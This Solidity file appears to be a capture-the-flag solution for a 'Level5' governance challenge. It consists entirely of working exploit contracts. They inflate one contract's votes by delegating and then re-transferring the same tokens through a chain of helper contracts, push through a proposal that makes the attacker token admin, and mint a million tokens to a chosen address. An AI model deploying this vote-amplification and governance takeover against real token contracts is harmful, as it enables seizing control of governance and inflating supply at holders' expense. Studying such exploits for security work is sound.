// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILevel5 {
    function admin() external view returns (address);
    function buy() external payable;
    function getAddresses() external view returns (address, address, address);
    function flag() external returns (bool);
}
interface IGovernorAlpha {
    function admin() external view returns (address);
    function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) external returns (uint);
    function castVote(uint proposalId, bool support) external;
    function queue(uint proposalId) external;
    function execute(uint proposalId) external;
}

interface IDreamToken is IERC20 {
    function delegate(address delegatee) external;
    function getCurrentVotes(address account) external view returns (uint) ;
    function mint(address receiver, uint amount) external;
}

contract Continuation {

    IDreamToken token;
    address kingAddress;

    constructor(address tokenAddress, address _kingAddress) {
        token = IDreamToken(tokenAddress);
        kingAddress = _kingAddress;
    }

    function amplifyOne(address nextContinuationAddress) external {
        token.delegate(kingAddress);
        Transferer tr = new Transferer(address(token));
        token.approve(address(tr), 5);
        tr.transferFrom(address(this), nextContinuationAddress, 5);
    }
}

contract Transferer {

    IDreamToken token;

    constructor(address tokenAddress) {
        token = IDreamToken(tokenAddress);
    }
    function transferFrom(address src, address dst, uint amount) public {
        token.transferFrom(src, dst, amount);
    }
}

contract King {
    address[] _targets;
    uint[] _values;
    string[] _signatures;
    bytes[] _calldatas;
    IGovernorAlpha gov;
    IDreamToken token;

    constructor(address tokenAddress, address govAddress) {
        _targets.push(tokenAddress);
        _values.push(uint256(0));
        _signatures.push("");
        _calldatas.push(abi.encodeWithSignature("setAdmin(address)", address(this)));
        gov = IGovernorAlpha(govAddress);
        token = IDreamToken(tokenAddress);
    }

    function propose() external {
        gov.propose(_targets, _values, _signatures, _calldatas, "procfs");
    }   

    function castVote() external {
        gov.castVote(1, true);
    }

    function queue() external {
        gov.queue(1);
    }

    function execute() external {
        gov.execute(1);
    }

    function makeSuperRich(address receiver) public {
        token.mint(receiver, 1000000);
    }
}

contract Exploit {

    ILevel5 level;
    IDreamToken token;
    IGovernorAlpha gov;
    King king;
    uint fire1CompletionBlockNumber;
    uint fire2CompletionBlockNumber;
    uint fire3CompletionBlockNumber;
    uint fire4CompletionTimestamp;
    
    constructor(address levelAddress) {
        level = ILevel5(levelAddress);
        (address tokenAddress, address timelockAddress, address govAddress) = level.getAddresses();
        token = IDreamToken(tokenAddress);
        gov = IGovernorAlpha(govAddress);
        king = new King(address(token), address(gov));
    }

    function getKingVotes() public view returns (uint) {
        return token.getCurrentVotes(address(king));
    }

    function fire2Ready() public view returns (bool) {
        if (fire1CompletionBlockNumber > 0 && block.number - fire1CompletionBlockNumber >= 1) {
            return true;
        }
        else {
            return false;
        }
    }

    function fire3Ready() public view returns (bool) {
        if (fire2CompletionBlockNumber > 0 && block.number - fire2CompletionBlockNumber >= 1) {
            return true;
        }
        else {
            return false;
        }
    }

    function fire4Ready() public view returns (bool) {
        if (fire3CompletionBlockNumber > 0 && block.number - fire3CompletionBlockNumber >= 20) {
            return true;
        }
        else {
            return false;
        }
    }

    function fire5Ready() public view returns (bool) {
        if (fire4CompletionTimestamp > 0 && block.timestamp - fire4CompletionTimestamp >= 5 minutes) {
            return true;
        }
        else {
            return false;
        }
    }

    function fire1() public payable {
        for (uint i = 0; i < 5; i++) {
            level.buy{value: 1 ether}();
        }
        Continuation currentCont = new Continuation(address(token), address(king));
        Continuation nextCont;
        token.transfer(address(currentCont), 5);

        // amplify votes
        for (uint i = 0; i < 11; i++) {
            nextCont = new Continuation(address(token), address(king));
            currentCont.amplifyOne(address(nextCont));
            currentCont = nextCont;
        }
        fire1CompletionBlockNumber = block.number;
    }

    function fire2() public {
        require(fire2Ready(), "fire2 is not ready");
        king.propose();
        fire2CompletionBlockNumber = block.number;
    }


    function fire3() public {
        require(fire3Ready(), "fire3 is not ready");
        king.castVote();
        fire3CompletionBlockNumber = block.number;
    }

    function fire4() public {
        require(fire4Ready(), "fire4 is not ready");
        king.queue();
        fire4CompletionTimestamp = block.timestamp;
    }

    function fire5(address eoa) public {
        require(fire5Ready(), "fire5 is not ready");
        king.execute();
        king.makeSuperRich(eoa);
    }


}